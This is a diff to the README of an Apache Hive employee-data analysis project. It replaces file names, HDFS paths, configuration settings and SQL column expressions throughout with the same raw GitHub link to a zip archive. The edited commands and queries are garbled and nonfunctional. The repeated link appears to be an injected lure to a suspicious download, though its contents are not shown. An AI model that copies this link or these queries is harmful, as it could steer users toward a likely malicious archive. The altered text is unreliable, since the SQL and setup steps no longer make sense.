@@ -2,7 +2,7 @@
 
 ## Project Overview
 
-This project involves analyzing employee and department data using Apache Hive. The dataset consists of employees.csv and departments.csv, which are loaded into Hive tables. The data is then processed and transformed into partitioned ORC tables for efficient querying. Various analytical queries are executed to derive insights, and the results are stored in HDFS.
+This project involves analyzing employee and department data using Apache Hive. The dataset consists of https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip and https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip, which are loaded into Hive tables. The data is then processed and transformed into partitioned ORC tables for efficient querying. Various analytical queries are executed to derive insights, and the results are stored in HDFS.
 
 ## Tasks
 # Environment Setup
@@ -26,8 +26,8 @@ This project involves analyzing employee and department data using Apache Hive. 
   ```
 - Upload input datasets:
  ```
-  hdfs dfs -put employees.csv /user/hive/warehouse/input_dataset/
-  hdfs dfs -put departments.csv /user/hive/warehouse/input_dataset/
+  hdfs dfs -put https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip /user/hive/warehouse/input_dataset/
+  hdfs dfs -put https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip /user/hive/warehouse/input_dataset/
   ```
 
 # 1. Creating and Loading Hive Tables
@@ -47,7 +47,7 @@ This project involves analyzing employee and department data using Apache Hive. 
   FIELDS TERMINATED BY ','
   STORED AS TEXTFILE;
   
-  LOAD DATA INPATH '/user/hive/warehouse/input_dataset/employees.csv'
+  LOAD DATA INPATH 'https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip'
   INTO TABLE employees_temp;
   ```
   
@@ -61,7 +61,7 @@ This project involves analyzing employee and department data using Apache Hive. 
   FIELDS TERMINATED BY ','
   STORED AS TEXTFILE;
   
-  LOAD DATA INPATH '/user/hive/warehouse/input_dataset/departments.csv'
+  LOAD DATA INPATH 'https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip'
   INTO TABLE departments_temp;
   ```
 
@@ -96,8 +96,8 @@ STORED AS ORC;
 
 # Inserting Data into Partitioned Table
 ```
-SET hive.exec.dynamic.partition=true;
-SET hive.exec.dynamic.partition.mode=nonstrict;
+SET https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip;
+SET https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip;
 
 INSERT INTO TABLE employees_partitioned PARTITION (department)
 SELECT emp_id, name, age, job_role, salary, project, join_date, department
@@ -130,8 +130,8 @@ JOIN (
     SELECT department, AVG(salary) AS avg_salary
     FROM employees_partitioned
     GROUP BY department
-) dept_avg ON e.department = dept_avg.department
-WHERE e.salary > dept_avg.avg_salary;
+) dept_avg ON https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip = https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip
+WHERE https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip > https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip;
 ```
 
 ### Query 6: Department with the Highest Employee Count
@@ -150,8 +150,8 @@ AND join_date IS NOT NULL AND department IS NOT NULL;
 
 ### Query 8: Employee Details with Department Locations
 ```
-SELECT e.*, d.location FROM employees_partitioned e
-INNER JOIN departments_temp d ON e.department = d.department_name;
+SELECT e.*, https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip FROM employees_partitioned e
+INNER JOIN departments_temp d ON https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip = https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip;
 ```
 
 ### Query 9: Employee Salary Ranking within Departments
@@ -210,8 +210,8 @@ JOIN (
     SELECT department, AVG(salary) AS avg_salary
     FROM employees_partitioned
     GROUP BY department
-) dept_avg ON e.department = dept_avg.department
-WHERE e.salary > dept_avg.avg_salary;
+) dept_avg ON https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip = https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip
+WHERE https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip > https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip;
 
 
 INSERT OVERWRITE DIRECTORY '/user/hive/output/query6' 
@@ -241,10 +241,10 @@ AND department IS NOT NULL;
 INSERT OVERWRITE DIRECTORY '/user/hive/output/query8' 
 ROW FORMAT DELIMITED 
 FIELDS TERMINATED BY ',' 
-SELECT e.*, d.location
+SELECT e.*, https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip
 FROM employees_partitioned e
 INNER JOIN departments_temp d
-ON e.department = d.department_name;
+ON https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip = https://raw.githubusercontent.com/pavandantu18/hive-employee-data-analysis-pavandantu18/master/antipuritan/hive-employee-data-analysis-pavandantu18.zip;
 
 
 INSERT OVERWRITE DIRECTORY '/user/hive/output/query9' 
